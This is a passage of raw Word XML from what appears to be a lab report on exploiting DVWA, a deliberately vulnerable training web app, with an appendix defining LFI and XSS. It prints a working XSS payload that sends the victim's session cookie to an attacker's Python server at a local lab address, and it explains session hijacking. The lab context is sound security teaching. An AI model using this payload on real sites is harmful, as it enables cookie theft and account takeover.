            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D73160" w14:textId="2BAD7E64" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">DVWA XSS Reflected </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Page After Execution of simple script code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E52DB74" w14:textId="77777777" w:rsidR="009F30FD" w:rsidRDefault="009F30FD" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38C846C8" w14:textId="1765E19E" w:rsidR="00ED0E81" w:rsidRDefault="00C5264E" w:rsidP="00ED0E81">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>4.2.</w:t>
      </w:r>
      <w:bookmarkStart w:id="22" w:name="_Hlk67663047"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Exploiting </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Reflected XSS To Get User’s Session Cookie</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="22"/>
    <w:p w14:paraId="5AA3843D" w14:textId="7682EE33" w:rsidR="006A13EC" w:rsidRPr="002358C6" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>A server is required to receive the session cookies data. Python has a simple module that can be used to set up a basic HTTP server</w:t>
      </w:r>
      <w:r w:rsidR="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkStart w:id="23" w:name="_Hlk67658772"/>
      <w:r w:rsidR="002358C6" w:rsidRPr="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure6.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="002358C6" w:rsidRPr="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
      <w:r w:rsidR="006A13EC">
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B5CA163" wp14:editId="7D73106A">
            <wp:extent cx="6848475" cy="4032885"/>
            <wp:effectExtent l="0" t="0" r="952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6877709" cy="4050100"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C748F1D" w14:textId="48920021" w:rsidR="00B04B29" w:rsidRDefault="002358C6" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Simple Python HTTP Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0E70CD" w14:textId="44DB800D" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:t>Back on the XSS page of the DVWA website, inputting the following in the text box should store the malicious script as an image</w:t>
      </w:r>
      <w:r w:rsidRPr="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>6]</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C942D0" w14:textId="4134BCAA" w:rsidR="00957B8D" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Kay&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>document.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>(‘&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>=”http://10.0.2.15:88/’+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>+’”&gt;’);&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F369E07" w14:textId="40B314AF" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="312D5338" wp14:editId="3A1C1520">
            <wp:extent cx="6848475" cy="3543300"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="46" name="Picture 4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ebsit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57842" cy="3548146"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4249A23A" w14:textId="3DB0B85C" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Inputting Script Payload To Retrieve User Cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35558845" w14:textId="15190756" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>The Python server running on the terminal receives a new input as soon as the DVWA browser processes and interprets the payload as JavaScript, it will try and access an image stored on the Python server running, with the value of the user’s cookie as a filename</w:t>
      </w:r>
      <w:r w:rsidRPr="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7AA183" w14:textId="17D4CE51" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="59FBA974" wp14:editId="549F11CD">
            <wp:extent cx="6823075" cy="390525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35248" cy="3912217"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0347A7FA" w14:textId="067D5F82" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Inputting Script Payload To Retrieve User Cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421D55C2" w14:textId="12C5A7AA" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:t xml:space="preserve">The server will register this request and return a 404 not found error. With this logged session </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>cookie</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a malicious attacker can then hijack a user’s session.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BDE964" w14:textId="67AF89DA" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81"/>
    <w:p w14:paraId="544858F2" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81"/>
    <w:p w14:paraId="6EF3E503" w14:textId="2B7DECFB" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72163709" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F72C781" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DE7A2ED" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="724E4348" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F2BB229" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33F94FDC" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="152F324D" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56651C41" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F13650D" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="426DE7D1" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B34087C" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="696BC547" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00B04B29">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D8E2E3B" w14:textId="24D05EBC" w:rsidR="00B04B29" w:rsidRDefault="00957B8D" w:rsidP="00C5264E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00957B8D">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Appendices</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FC399A" w14:textId="77777777" w:rsidR="00957B8D" w:rsidRPr="00957B8D" w:rsidRDefault="00957B8D" w:rsidP="00957B8D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:after="240"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00957B8D">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Definitions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797EF8A1" w14:textId="772B0E20" w:rsidR="00C50BF7" w:rsidRDefault="003353DD" w:rsidP="00C50BF7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C64A03">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Local File Inclusion (LFI)</w:t>
      </w:r>
      <w:r w:rsidRPr="003353DD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="003353DD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerability mostly found in web servers. This vulnerability is exploited when a user input contains a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003353DD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>path to file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="003353DD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r w:rsidRPr="003353DD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> might be present on the server and will be included in the output. This kind of vulnerability can be used to read files containing sensitive and confidential data from the vulnerable system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3205C000" w14:textId="68E55374" w:rsidR="00C50BF7" w:rsidRPr="00C50BF7" w:rsidRDefault="00C50BF7" w:rsidP="00C50BF7">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Cross-site scripting (XSS)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a security vulnerability typically found in web applications. It’s a type of injection </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> can allow an attacker to execute malicious scripts and have </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>them</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> execute on a victim’s machine.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Segoe UI"/>
          <w:color w:val="24292E"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>A web application is vulnerable to XSS if it uses unsensitized user input. XSS is possible in JavaScript, VBScript, Flash</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00C50BF7">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Courier New"/>
          <w:color w:val="212529"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> and CSS.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
